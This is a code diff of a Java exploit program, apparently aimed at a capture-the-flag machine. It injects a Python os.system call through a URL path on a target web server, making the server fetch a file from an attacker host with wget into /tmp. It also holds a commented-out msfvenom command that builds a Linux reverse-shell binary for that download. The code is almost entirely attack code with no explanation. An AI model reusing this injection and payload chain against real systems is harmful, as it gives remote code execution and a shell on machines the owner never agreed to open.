@@ -12,8 +12,8 @@ public class App {
 
 	public static void main(String[] args) {
 
-		String LHOST = args[0];
-		String LPORT = args[1];
+		//String LHOST = args[0];
+		//String LPORT = args[1];
 		
 		/*String cmd = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f elf -o jj.elf";
 		ejecutar(cmd);
@@ -41,11 +41,12 @@ public class App {
 		String cmd = "wget http://10.10.16.50/jj.elf -O /tmp/jj.elf";
 		URL url;
 		try {
-			url = new URL("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
+			//url = new URL("http://192.168.253.132/README.md");
+			url = new URL("http://10.10.10.168:8080/';path='/';os.system('wget http://10.10.16.50/README.md -O /tmp/jj.txt');'");
+			//url = new URL("http://192.168.253.132/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
 			HttpURLConnection con = (HttpURLConnection) url.openConnection();
-			con.getInputStream();
 			con.setRequestMethod("GET");
-			
+			con.getInputStream();
 		} catch (MalformedURLException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
